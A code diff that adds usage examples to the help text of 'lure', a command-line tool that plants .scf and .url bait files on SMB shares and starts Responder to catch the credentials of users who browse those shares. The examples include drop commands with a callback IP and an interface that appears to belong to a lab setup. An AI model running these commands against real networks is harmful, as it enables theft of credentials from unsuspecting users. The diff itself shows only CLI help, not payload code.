@@ -344,6 +344,61 @@ def cmd_list(args, parser):
 # Parser construction
 # ---------------------------------------------------------------------------
 
+class _SubcommandHelpFormatter(
+    argparse.ArgumentDefaultsHelpFormatter,
+    argparse.RawDescriptionHelpFormatter,
+):
+    """Show option defaults *and* preserve raw newlines in the epilog."""
+
+
+_DROP_EXAMPLES = """\
+Examples:
+  # Drop just the .scf payload on an open share
+  sudo lure drop -t 10.10.10.5 -c 10.10.14.3 -i tun0 -s public -p scf
+
+  # Authenticated upload, prompting for the password
+  sudo lure drop -t 10.10.10.5 -c 10.10.14.3 -i tun0 -s shares \\
+                 -u CORP/jdoe --ask-pass
+
+  # Drop all three (default) into a nested subdirectory
+  sudo lure drop -t 10.10.10.5 -c 10.10.14.3 -i tun0 -s shares \\
+                 -d HR/public
+
+  # Drop only — leave Responder for a separate terminal
+  sudo lure drop -t 10.10.10.5 -c 10.10.14.3 -s public --no-listen
+
+  # See exactly what would happen, no side effects
+  sudo lure drop -t 10.10.10.5 -c 10.10.14.3 -s public --dry-run
+"""
+
+_CLEAN_EXAMPLES = """\
+Examples:
+  # Remove all three @lure.* payloads from a share
+  sudo lure clean -t 10.10.10.5 -s public
+
+  # Remove only the .url payload
+  sudo lure clean -t 10.10.10.5 -s public -p url
+
+  # Remove custom-named payloads from a nested directory
+  sudo lure clean -t 10.10.10.5 -s shares -d HR/public --name @docs
+"""
+
+_LISTEN_EXAMPLES = """\
+Examples:
+  # Start Responder on tun0
+  sudo lure listen -i tun0
+"""
+
+_LIST_EXAMPLES = """\
+Examples:
+  # Anonymous share enumeration
+  lure list -t 10.10.10.5
+
+  # Authenticated enumeration with a domain account
+  lure list -t 10.10.10.5 -u CORP/jdoe --ask-pass
+"""
+
+
 def _add_auth_args(p):
     """User / password args shared by every SMB-touching subcommand."""
     p.add_argument("-u", "--user", metavar="USER",
@@ -386,7 +441,8 @@ def build_parser():
     p_drop = sub.add_parser(
         "drop",
         help="Drop bait files onto a share and (optionally) start Responder",
-        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
+        formatter_class=_SubcommandHelpFormatter,
+        epilog=_DROP_EXAMPLES,
     )
     _add_target_args(p_drop)
     p_drop.add_argument("-c", "--callback", required=True, metavar="IP",
@@ -414,7 +470,8 @@ def build_parser():
     p_clean = sub.add_parser(
         "clean",
         help="Remove previously dropped bait from a share",
-        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
+        formatter_class=_SubcommandHelpFormatter,
+        epilog=_CLEAN_EXAMPLES,
     )
     _add_target_args(p_clean)
     p_clean.add_argument("-p", "--payload", action="append",
@@ -433,7 +490,8 @@ def build_parser():
     p_listen = sub.add_parser(
         "listen",
         help="Start Responder only (no upload)",
-        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
+        formatter_class=_SubcommandHelpFormatter,
+        epilog=_LISTEN_EXAMPLES,
     )
     p_listen.add_argument("-i", "--iface", required=True, metavar="IFACE",
                           help="Network interface for Responder")
@@ -443,7 +501,8 @@ def build_parser():
     p_list = sub.add_parser(
         "list",
         help="Enumerate shares on a target via 'smbclient -L'",
-        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
+        formatter_class=_SubcommandHelpFormatter,
+        epilog=_LIST_EXAMPLES,
     )
     p_list.add_argument("-t", "--target", required=True, metavar="IP",
                         help="Target SMB server")
